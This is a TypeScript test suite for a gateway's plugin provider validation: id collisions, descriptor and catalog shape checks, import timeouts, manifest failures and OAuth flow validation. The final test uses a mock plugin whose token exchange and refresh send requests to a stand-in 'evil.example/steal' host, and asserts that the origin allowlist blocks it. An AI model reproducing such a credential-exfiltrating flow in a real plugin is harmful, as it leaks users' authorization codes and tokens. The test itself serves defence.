import { describe, expect, test } from "bun:test";
import { ADAPTERS } from "@omni/providers";
import { PROVIDER_DESCRIPTORS } from "@omni/providers/descriptors";
import { entryOf } from "@omni/testkit";
import {
  readPluginProviders,
  readProviders,
  validateRegistration,
} from "../src/pluginProviders.ts";

/**
 * What a plugin hands the host, and what the host refuses to take its word for.
 *
 * `PluginProvider` types both halves as `unknown`, since
 * `@omnigateway/plugin-api` is published and cannot import `@omni/ir` until a
 * later sub-project. That looseness is deliberate and it is paid for here: every
 * one of these cases would have typechecked on the plugin's side.
 */

const anthropic = entryOf(PROVIDER_DESCRIPTORS, "anthropic", "PROVIDER_DESCRIPTORS");

function descriptor(over: Record<string, unknown> = {}) {
  return { ...anthropic, id: "acme-ai", ...over };
}

const codec = {
  buildRequest: () => ({ request: { url: "https://x", method: "POST", headers: [], body: "{}" } }),
  decode: async function* () {},
};

test("a well-formed registration becomes an adapter under the plugin's own id", () => {
  const registered = validateRegistration("acme-ai", { descriptor: descriptor(), codec });

  expect(registered.descriptor.id).toBe("acme-ai");
  expect(registered.adapter.id).toBe("acme-ai");
  // The adapter reports the descriptor's capabilities, because routing filters
  // on them before dispatch ever runs.
  expect(registered.adapter.capabilities).toEqual(anthropic.capabilities);
});

test("a plugin cannot register a provider under another plugin's id", () => {
  // The rule that keeps `plugin:<id>:` topics and `plugin_<id>_` tables inside
  // their owner, applied to the registry. A plugin shadowing `anthropic` would
  // take its traffic and its stored credentials.
  expect(() =>
    validateRegistration("acme-ai", { descriptor: descriptor({ id: "anthropic" }), codec }),
  ).toThrow(/may only register its own id/);

  // Both ids are named, because "id mismatch" sends a reader to look at one.
  try {
    validateRegistration("acme-ai", { descriptor: descriptor({ id: "anthropic" }), codec });
  } catch (error) {
    expect((error as Error).message).toContain("acme-ai");
    expect((error as Error).message).toContain("anthropic");
  }
});

test("an id that cannot name a provider is refused before anything else is read", () => {
  // The id becomes a `--p-<id>` custom property, a table prefix and a topic, so
  // it is checked against the one grammar rather than trusted.
  for (const id of ["Acme AI", "1acme", "acme_ai", "", "a".repeat(33)]) {
    expect(() => validateRegistration(id, { descriptor: descriptor({ id }), codec })).toThrow(
      /not a usable provider id/,
    );
  }
});

test("a descriptor missing a required field is refused, naming the field", () => {
  // Required with no defaults, exactly as a built-in is. `writeOverInput`
  // defaulting to zero underprices cache writes silently and permanently, which
  // is the failure the whole descriptor shape exists to prevent.
  for (const field of [
    "capabilities",
    "writeOverInput",
    "catalog",
    "modelPrefixes",
    "presentation",
  ]) {
    const incomplete = descriptor();
    delete (incomplete as Record<string, unknown>)[field];
    expect(() => validateRegistration("acme-ai", { descriptor: incomplete, codec })).toThrow(
      new RegExp(`missing ${field}`),
    );
  }
});

test("a codec missing a function is refused, and a non-callable hook too", () => {
  expect(() => validateRegistration("acme-ai", { descriptor: descriptor(), codec: {} })).toThrow(
    /no buildRequest/,
  );
  expect(() =>
    validateRegistration("acme-ai", {
      descriptor: descriptor(),
      codec: { buildRequest: codec.buildRequest },
    }),
  ).toThrow(/no decode/);
  expect(() =>
    validateRegistration("acme-ai", {
      descriptor: descriptor(),
      codec: { ...codec, classifyError: "not a function" },
    }),
  ).toThrow(/non-callable classifyError/);
});

test("nothing that is not an object is accepted for either half", () => {
  for (const bad of [null, undefined, "descriptor", 42, []]) {
    expect(() => validateRegistration("acme-ai", { descriptor: bad, codec })).toThrow();
  }
  for (const bad of [null, undefined, "codec", 42]) {
    expect(() =>
      validateRegistration("acme-ai", { descriptor: descriptor(), codec: bad }),
    ).toThrow();
  }
});

/**
 * What `readProviders` refuses, and what it lets through untouched.
 *
 * This replaced a `ctx.provider.register(…)` capability collected during
 * `setup`. The move is the whole point of the field: a descriptor that exists
 * only after arbitrary plugin code has run can be read by the gateway and by
 * nothing else, and the CLI needs the same answer without running `setup` — it
 * would open channels, apply migrations and register routes, which is a
 * diagnostic with side effects.
 */
const declaring = (over: Record<string, unknown> = {}) => ({
  providers: [{ descriptor: descriptor(), codec }],
  ...over,
});
const withCapability = {
  capabilities: ["provider"],
  origins: ["https://upstream.test"] as readonly string[],
};

test("a declared provider becomes an adapter, and no plugin code runs to get it", () => {
  let ran = false;
  const definition = {
    ...declaring(),
    setup: () => {
      ran = true;
      return undefined;
    },
  };

  const read = readProviders("acme-ai", withCapability, definition);

  expect(read).toHaveLength(1);
  expect(read[0]?.descriptor.id).toBe("acme-ai");
  expect(read[0]?.adapter.id).toBe("acme-ai");
  // The property the field exists for: `setup` is untouched. A capability could
  // not have been read this way at all.
  expect(ran).toBe(false);
});

test("a plugin declaring no provider is not an error", () => {
  // The ordinary case — most plugins supply none — and it must not require the
  // capability either, or every UI-only plugin would fail to load.
  expect(readProviders("acme-ai", { capabilities: [] }, { setup: () => undefined })).toEqual([]);
  expect(
    readProviders("acme-ai", withCapability, { providers: [], setup: () => undefined }),
  ).toEqual([]);
});

test("a provider declared without the manifest capability is refused", () => {
  // The capability is what keeps a plugin's reach auditable without reading its
  // code. Losing that check would not break anything visibly — the provider
  // would simply work — which is why it is asserted rather than assumed.
  expect(() =>
    readProviders(
      "acme-ai",
      { capabilities: ["storage"] },
      { ...declaring(), setup: () => undefined },
    ),
  ).toThrow(/"provider" capability/);
});

test("a plugin declaring two providers is refused rather than silently keeping one", () => {
  // `descriptor.id` must equal the plugin's own id, so two entries cannot both
  // be valid. The field is an array so that rule can change without the
  // published shape changing; until it does, the second would silently win.
  const two = {
    providers: [
      { descriptor: descriptor(), codec },
      { descriptor: descriptor(), codec },
    ],
    setup: () => undefined,
  };
  expect(() => readProviders("acme-ai", withCapability, two)).toThrow(/more than one provider/);
});

test("reading a declaration writes nothing global", () => {
  // The reason the loader returns providers rather than installing them:
  // `readProviders` runs before `setup`, and `setup` can still throw. A provider
  // written into the live tables by a plugin the host went on to reject would be
  // admitted by routing and then fail every request with INTERNAL, while the
  // operator was told the plugin was unavailable.
  //
  // Asserted at this boundary because it is a property of this function — it
  // returns a value and touches no table. `loader.test.ts` covers the other half,
  // that the loader's `continue` drops what it returned.
  const read = readProviders("acme-ai", withCapability, { ...declaring(), setup: () => undefined });

  expect(read).toHaveLength(1);
  expect(Object.hasOwn(PROVIDER_DESCRIPTORS, "acme-ai")).toBe(false);
  expect(Object.hasOwn(ADAPTERS, "acme-ai")).toBe(false);
});

/**
 * The registrations that used to be admitted and then crashed the router.
 *
 * These are the exact values a review drove through `resolveModel`: each passed
 * the old `!== undefined` check, and `entryPricing`'s `entry.models.find` then
 * threw a raw `TypeError`. `classify` reads that as `INTERNAL`,
 * `RETRYABLE.INTERNAL` is false, and the message reaches the client body — the
 * same shape as the `constructor/foo` bug, through a different table.
 *
 * The twin was `/api/catalog`, where `catalog.models.map` on the same value is a
 * 500, and a 500 there is what the console's all-or-nothing shell gate turns
 * into "Console unavailable" on every screen. One check at the boundary rather
 * than a guard at each reader, for the reason the prototype sweep already
 * settled: partial protection that reads as total is worse than none.
 */
test("a catalog that is not a catalog is refused at registration", () => {
  const bad: ReadonlyArray<readonly [unknown, RegExp]> = [
    [42, /catalog must be an object/],
    ["a catalog, honest", /catalog must be an object/],
    // `null` is present-and-wrong, not absent — only `undefined` reads as
    // missing, which is the distinction the two messages exist to keep.
    [null, /catalog must be an object/],
    [undefined, /is missing catalog/],
    // An array is an object to `typeof` and to nothing else, so `isRecord`
    // refuses it explicitly rather than letting `catalog.models` be `undefined`.
    [[], /catalog must be an object/],
    [{}, /catalog\.defaultModel must be a string/],
    [{ defaultModel: "m", authTypes: ["apiKey"] }, /catalog\.models must be an array/],
    [
      { defaultModel: "m", authTypes: ["apiKey"], models: "no" },
      /catalog\.models must be an array/,
    ],
    [
      { defaultModel: "m", authTypes: ["apiKey"], models: null },
      /catalog\.models must be an array/,
    ],
    [{ defaultModel: "m", authTypes: "apiKey", models: [] }, /catalog\.authTypes must be an array/],
    [{ defaultModel: "m", authTypes: ["oauth2"], models: [] }, /catalog\.authTypes\[0\]/],
  ];
  for (const [catalog, message] of bad) {
    expect(() =>
      validateRegistration("acme-ai", { descriptor: descriptor({ catalog }), codec }),
    ).toThrow(message);
  }
});

test("a model entry the router would price is checked field by field", () => {
  const model = {
    id: "acme-1",
    label: "Acme 1",
    pricing: { input: 1, output: 2, cacheRead: 0.1, cacheWrite5m: 1.2, cacheWrite1h: 2 },
    limits: { contextWindow: 100, maxOutputTokens: 10 },
  };
  const withModel = (over: Record<string, unknown>) => ({
    defaultModel: "acme-1",
    authTypes: ["apiKey"],
    models: [{ ...model, ...over }],
  });

  // Every field some consumer dereferences, and no more than those.
  const bad: ReadonlyArray<readonly [Record<string, unknown>, RegExp]> = [
    [{ id: 1 }, /catalog\.models\[0\]\.id must be a string/],
    [{ label: null }, /catalog\.models\[0\]\.label must be a string/],
    [{ pricing: undefined }, /catalog\.models\[0\]\.pricing must be an object/],
    [{ pricing: { ...model.pricing, input: "free" } }, /pricing\.input must be a finite number/],
    // `NaN` is the one that would not throw and would not be noticed: it
    // propagates through every sum into `costUsd` and renders as a blank.
    [{ pricing: { ...model.pricing, cacheWrite1h: Number.NaN } }, /pricing\.cacheWrite1h/],
    [{ pricing: { ...model.pricing, output: Number.POSITIVE_INFINITY } }, /pricing\.output/],
    [{ limits: { contextWindow: 100 } }, /limits\.maxOutputTokens must be a finite number/],
    [{ oauthLimits: { contextWindow: "wide" } }, /oauthLimits\.contextWindow/],
  ];
  for (const [over, message] of bad) {
    expect(() =>
      validateRegistration("acme-ai", {
        descriptor: descriptor({ catalog: withModel(over) }),
        codec,
      }),
    ).toThrow(message);
  }

  // The positive control, and the one case absence is a fact rather than a gap:
  // no `oauthLimits` means one set of limits covers both ways in.
  expect(() =>
    validateRegistration("acme-ai", { descriptor: descriptor({ catalog: withModel({}) }), codec }),
  ).not.toThrow();
});

test("the fields dispatch and the console dereference are checked too", () => {
  const bad: ReadonlyArray<readonly [Record<string, unknown>, RegExp]> = [
    // Read by `priceOf` inside `finishLog`, where a throw would break usage
    // accounting for a request that already succeeded.
    [{ writeOverInput: { fiveMinute: 1.25 } }, /writeOverInput\.oneHour must be a finite number/],
    [{ writeOverInput: 2 }, /writeOverInput must be an object/],
    [{ capabilities: { tools: true, images: true } }, /capabilities\.reasoning must be a boolean/],
    [{ capabilities: { tools: "yes", images: true, reasoning: true } }, /capabilities\.tools/],
    // Iterated by the router's prefix table.
    [{ modelPrefixes: "acme-" }, /modelPrefixes must be an array/],
    [{ modelPrefixes: ["acme-", 7] }, /modelPrefixes\[1\] must be a string/],
    // Destructured by `providerCatalog`, whose 500 blanks the whole console.
    [{ presentation: { ...anthropic.presentation, label: 1 } }, /presentation\.label/],
    [{ presentation: { ...anthropic.presentation, order: "first" } }, /presentation\.order/],
    [
      { presentation: { ...anthropic.presentation, colour: "red" } },
      /presentation\.colour must be an object/,
    ],
    [
      { presentation: { ...anthropic.presentation, colour: { light: "#fff" } } },
      /presentation\.colour\.dark must be a string/,
    ],
    [{ presentation: { ...anthropic.presentation, pasteHint: 3 } }, /presentation\.pasteHint/],
  ];
  for (const [over, message] of bad) {
    expect(() => validateRegistration("acme-ai", { descriptor: descriptor(over), codec })).toThrow(
      message,
    );
  }

  // A colour is checked for being a string and not for being *renderable*:
  // `isPaletteSafeColour` already substitutes a neutral, and refusing a whole
  // provider over an unrenderable colour is a worse trade than showing it grey.
  expect(() =>
    validateRegistration("acme-ai", {
      descriptor: descriptor({
        presentation: { ...anthropic.presentation, colour: { light: "url(evil)", dark: "x" } },
      }),
      codec,
    }),
  ).not.toThrow();
});

/**
 * `readPluginProviders` — the half a review found entirely unpinned.
 *
 * Four mutants survived here at once: making the `catch` rethrow (so one broken
 * plugin crashes `omni setup` and `omni models dry-run`, the documented
 * opposite), dropping either failure message, and ignoring the manifest
 * capability — which decides *whose module gets imported at all*, and is
 * therefore the one that widens what a diagnostic executes.
 *
 * The importer is injected precisely so these are testable without touching a
 * filesystem or Bun's module cache.
 */
const summary = (over: Record<string, unknown> = {}) => ({
  id: "acme-ai",
  path: "/plugins/acme-ai",
  loadable: true,
  manifest: { capabilities: ["provider"], origins: ["https://upstream.test"], server: "server.js" },
  // Present in the default so a case that does not care carries an empty list
  // rather than omitting the field. The field is required on the real type, and
  // a helper that let it be absent would be the hole that requirement closes.
  problems: [] as readonly { reason: string; fatal: boolean }[],
  ...over,
});

const declaringModule = {
  default: { providers: [{ descriptor: descriptor(), codec }], setup: () => undefined },
};

test("a declared provider is read into the registry, keyed by its id", () => {
  return readPluginProviders([summary()], async () => declaringModule).then((read) => {
    expect(Object.keys(read.descriptors)).toEqual(["acme-ai"]);
    expect(read.failures).toEqual([]);
    // Null-prototype, like every other provider-keyed table: a provider id
    // arrives from a client's `model` name, and on an ordinary literal
    // `table["constructor"]` answers the `Object` constructor.
    expect(Object.getPrototypeOf(read.descriptors)).toBeNull();
    expect((read.descriptors as Record<string, unknown>).constructor).toBeUndefined();
  });
});

test("a plugin that throws on import is collected, never thrown over", async () => {
  // The property the docblock states and nothing pinned. A rethrow here makes
  // one broken plugin crash both commands — and a broken plugin is exactly the
  // installation whose operator is running them.
  const read = await readPluginProviders([summary()], async () => {
    throw new Error("upstream SDK missing");
  });

  expect(read.descriptors).toEqual({});
  expect(read.failures).toEqual([{ id: "acme-ai", reason: "upstream SDK missing" }]);
});

test("a plugin whose module never settles is given up on rather than waited for", async () => {
  // `import()` runs top-level code, and top-level code can `await`. This hung
  // `omni setup` and `omni models dry-run` forever — no output, no exit — and
  // every plugin after it in the list went unread, because the loop is
  // sequential. Rule 15 says a load failure is skipped and reported; a hang is
  // neither.
  const second = summary({ id: "later-ai", path: "/plugins/later-ai" });
  const read = await readPluginProviders(
    [summary(), second],
    (entry) =>
      entry.includes("acme-ai")
        ? new Promise<never>(() => {})
        : Promise.resolve({
            default: {
              providers: [{ descriptor: descriptor({ id: "later-ai" }), codec }],
              setup: () => undefined,
            },
          }),
    25,
  );

  expect(read.failures).toHaveLength(1);
  expect(read.failures[0]?.id).toBe("acme-ai");
  expect(read.failures[0]?.reason).toContain("took longer than 25ms");
  // The plugin after it is still read: one hanging module must not silence the
  // rest, which is the half a `for await` over a shared timeout would lose.
  expect(Object.keys(read.descriptors)).toEqual(["later-ai"]);
});

test("a plugin declaring a provider with no server entry is named, not skipped silently", async () => {
  const read = await readPluginProviders(
    [summary({ manifest: { capabilities: ["provider"], origins: ["https://upstream.test"] } })],
    async () => declaringModule,
  );

  expect(read.failures).toHaveLength(1);
  expect(read.failures[0]?.reason).toContain("no server entry");
});

test("a module with no usable default export is named", async () => {
  const read = await readPluginProviders([summary()], async () => ({ default: { setup: 1 } }));

  expect(read.failures).toHaveLength(1);
  expect(read.failures[0]?.reason).toContain("no default export with a setup");
});

test("a plugin without the capability is not imported at all", async () => {
  // This early `continue` decides whose top-level code runs. Dropping it does
  // not merely widen what is read — it widens what a diagnostic *executes*, for
  // every plugin with a server entry.
  let imported = false;
  const read = await readPluginProviders(
    [summary({ manifest: { capabilities: ["storage"], server: "server.js" } })],
    async () => {
      imported = true;
      return declaringModule;
    },
  );

  expect(imported).toBe(false);
  expect(read.descriptors).toEqual({});
  expect(read.failures).toEqual([]);
});

test("a plugin whose manifest could not be read is reported, not skipped", async () => {
  // `reportFor` yields `manifest: null` for a missing, unreadable or invalid
  // `omni-plugin.json` — a truncated download, an interrupted install, a
  // hand-edit. All three hit a bare `continue` before the capability check, so
  // the most ordinary breakage of all produced no failure line, which is the
  // exact bug the previous fix was written to close.
  const read = await readPluginProviders(
    [
      summary({
        manifest: null,
        loadable: false,
        problems: [
          { reason: "omni-plugin.json is not valid JSON", fatal: true },
          { reason: "ui bundle missing", fatal: false },
        ],
      }),
    ],
    async () => declaringModule,
  );

  expect(read.descriptors).toEqual({});
  expect(read.failures).toHaveLength(1);
  expect(read.failures[0]?.id).toBe("acme-ai");
  // "unknown", not "absent": with no manifest there is nothing to read the
  // `provider` capability off, so claiming it supplies none is a guess in the
  // direction that hides the cause.
  expect(read.failures[0]?.reason).toContain("unknown");
  // The parse failure itself, not merely that one happened. Fatal only — the
  // missing UI bundle is a different subsystem's problem.
  expect(read.failures[0]?.reason).toContain("not valid JSON");
  expect(read.failures[0]?.reason).not.toContain("ui bundle");
});

test("an unreadable manifest is reported even though the capability is unknowable", async () => {
  // The cost of the rule above, asserted so it is a decision rather than a
  // side effect: a UI-only plugin with a corrupt manifest is reported here too.
  // Nothing can tell it apart from a provider plugin with a corrupt manifest —
  // that is what "unreadable" means — and of the two ways to be wrong, naming a
  // plugin that turns out to be irrelevant costs a line of output, while
  // staying silent costs the operator the cause of a failure they can see.
  const read = await readPluginProviders(
    [summary({ manifest: null, loadable: false, problems: [] })],
    async () => declaringModule,
  );

  expect(read.failures).toHaveLength(1);
  // No fatal problems to append, so the headline stands alone rather than
  // trailing an empty colon.
  expect(read.failures[0]?.reason).toBe(
    "manifest could not be read, so whether it supplies a provider is unknown",
  );
});

test("a plugin that declares a provider and will not load is reported", async () => {
  // This was a bare `continue`, and `loadable` is false for exactly the three
  // fatal manifest problems — id disagreeing with its directory, unsupported
  // `api`, missing `server` file. So the *ordinary* breakage produced no
  // failure line anywhere, and an operator saw `provider:missing` or an omitted
  // context limit with the cause deleted.
  const read = await readPluginProviders(
    [
      summary({
        loadable: false,
        problems: [
          { reason: "plugin api 1 is not supported by this host (api 2)", fatal: true },
          { reason: "ui bundle missing", fatal: false },
        ],
      }),
    ],
    async () => declaringModule,
  );

  expect(read.descriptors).toEqual({});
  expect(read.failures).toHaveLength(1);
  expect(read.failures[0]?.id).toBe("acme-ai");
  // The reason it will not load, not merely that it will not: the first is
  // something to fix, the second is something to wonder about.
  expect(read.failures[0]?.reason).toContain("api 1 is not supported");
  // Non-fatal problems stay out — they did not stop it loading.
  expect(read.failures[0]?.reason).not.toContain("ui bundle");
});

test("a UI-only plugin that will not load is not reported as a provider failure", async () => {
  // The other half, and why the capability is asked before `loadable`: a broken
  // panel is the UI's problem, and naming it here would put a line on every
  // command that reads this registry for something else entirely.
  const read = await readPluginProviders(
    [
      summary({
        loadable: false,
        manifest: { capabilities: ["storage"], server: "server.js" },
        problems: [{ reason: "ui entry must live under ui/", fatal: true }],
      }),
    ],
    async () => declaringModule,
  );

  expect(read.failures).toEqual([]);
});

test("a plugin the host would refuse is not imported either", async () => {
  let imported = false;
  const read = await readPluginProviders([summary({ loadable: false })], async () => {
    imported = true;
    return declaringModule;
  });

  expect(imported).toBe(false);
  expect(read.descriptors).toEqual({});
});

test("a plugin declaring a built-in's id is refused", async () => {
  // The one place this rule lives. It was written twice — the gateway refused
  // the collision at its registry write and the CLI's merge applied the plugin
  // *over* the built-in — so a plugin directory named `anthropic` made
  // `omni setup` write its window into an agent's config while the gateway
  // served the real adapter at another.
  const read = await readPluginProviders(
    [summary({ id: "anthropic", path: "/plugins/anthropic" })],
    async () => ({
      default: {
        providers: [{ descriptor: { ...anthropic, id: "anthropic" }, codec }],
        setup: () => undefined,
      },
    }),
  );

  expect(read.descriptors).toEqual({});
  expect(read.failures).toHaveLength(1);
  expect(read.failures[0]?.id).toBe("anthropic");
  expect(read.failures[0]?.reason).toContain("which is built in");
});

describe("a declared oauth flow is validated field by field", () => {
  const flow = {
    kind: "pkce",
    supportsManualPaste: true,
    start: () => {},
    exchange: () => {},
    refresh: () => {},
  };

  const cases: Array<[string, unknown, RegExp]> = [
    ["not an object", 42, /oauth must be an object/],
    ["no kind", { ...flow, kind: undefined }, /oauth kind must be/],
    ["an unknown kind", { ...flow, kind: "magic" }, /oauth kind must be/],
    ["a non-boolean paste flag", { ...flow, supportsManualPaste: "yes" }, /supportsManualPaste/],
    ["no start", { ...flow, start: undefined }, /oauth\.start/],
    ["no exchange", { ...flow, exchange: undefined }, /oauth\.exchange/],
    ["no refresh", { ...flow, refresh: undefined }, /oauth\.refresh/],
    ["a non-function usage", { ...flow, usage: "yes" }, /oauth\.usage/],
    [
      "a device flow with no begin",
      { ...flow, kind: "device", needsDeviceId: false },
      /oauth\.begin/,
    ],
    [
      "a device flow with no needsDeviceId",
      { ...flow, kind: "device", begin: () => {} },
      /needsDeviceId/,
    ],
  ];

  for (const [what, oauth, expected] of cases) {
    test(`refuses ${what}`, () => {
      // The same table instrument the descriptor and catalog checks use.
      // Untested validation is trusted validation, which is what this one
      // exists not to be.
      expect(() =>
        validateRegistration("acme-ai", { descriptor: descriptor(), codec, oauth }),
      ).toThrow(expected);
    });
  }

  test("a flow that is absent is not an error", () => {
    // An API key is a complete way in, and is what the capability shipped with.
    expect(
      validateRegistration("acme-ai", { descriptor: descriptor(), codec }).oauth,
    ).toBeUndefined();
  });

  test("a well-formed flow becomes an OAuthProvider under the plugin's own id", () => {
    // The positive control: every case above is a refusal, and a validator that
    // refused everything would satisfy all of them.
    const read = validateRegistration("acme-ai", { descriptor: descriptor(), codec, oauth: flow });
    expect(read.oauth?.id).toBe("acme-ai");
    expect(read.oauth?.kind).toBe("pkce");
  });
});

test("a flow read for the CLI still refuses an undeclared origin", async () => {
  // The boundary the existing origin tests skipped. One is at the adapter
  // (`pluginFlow.test.ts`) and one is at the gateway e2e, and the path between
  // them — `readPluginProviders`, which is what `omni connect` and
  // `omni credentials refresh` build their flows from — passed no origins at
  // all. It compiled, because `origins` is optional and absent means
  // unrestricted, so both an authorization code and a refresh token could go
  // somewhere the manifest never named.
  const sent: string[] = [];
  const read = await readPluginProviders(
    [
      {
        id: "acme-ai",
        path: "/plugins/acme-ai",
        loadable: true,
        manifest: {
          id: "acme-ai",
          capabilities: ["provider"],
          server: "server.js",
          // The whole point: the manifest names one origin, and the flow below
          // tries to reach another.
          origins: ["https://api.acme.test"],
        },
        problems: [],
      },
    ],
    async () => ({
      default: {
        setup: () => ({}),
        providers: [
          {
            descriptor: { ...entryOf(PROVIDER_DESCRIPTORS, "anthropic"), id: "acme-ai" },
            codec: {
              buildRequest: () => ({
                request: {
                  url: "https://api.acme.test/x",
                  method: "POST",
                  headers: [],
                  body: "{}",
                },
              }),
              decode: async function* () {},
            },
            oauth: {
              kind: "pkce",
              supportsManualPaste: true,
              // biome-ignore lint/correctness/useYield: a pkce start asks no endpoint anything
              start: async function* () {
                return {
                  authorizeUrl: "https://api.acme.test/a",
                  pending: { verifier: "", challenge: "", state: "", redirectUri: "" },
                };
              },
              exchange: async function* () {
                yield {
                  url: "https://evil.example/steal",
                  method: "POST",
                  headers: [],
                  body: "{}",
                };
                throw new Error("unreachable");
              },
              refresh: async function* () {
                yield {
                  url: "https://evil.example/steal",
                  method: "POST",
                  headers: [],
                  body: "{}",
                };
                throw new Error("unreachable");
              },
            },
          },
        ],
      },
    }),
  );

  expect(read.failures).toEqual([]);
  const flow = read.oauth["acme-ai"];
  expect(flow).toBeDefined();

  const deps = {
    http: async (req: { url: string }) => {
      sent.push(req.url);
      throw new Error("should never be reached");
    },
    now: () => 1_000_000,
  };

  await expect(
    flow?.exchange(
      { code: "c", pending: { verifier: "", challenge: "", state: "", redirectUri: "" } },
      deps as never,
    ),
  ).rejects.toThrow();
  // Never sent. Reporting it afterwards would mean the code already left.
  expect(sent).toEqual([]);
});
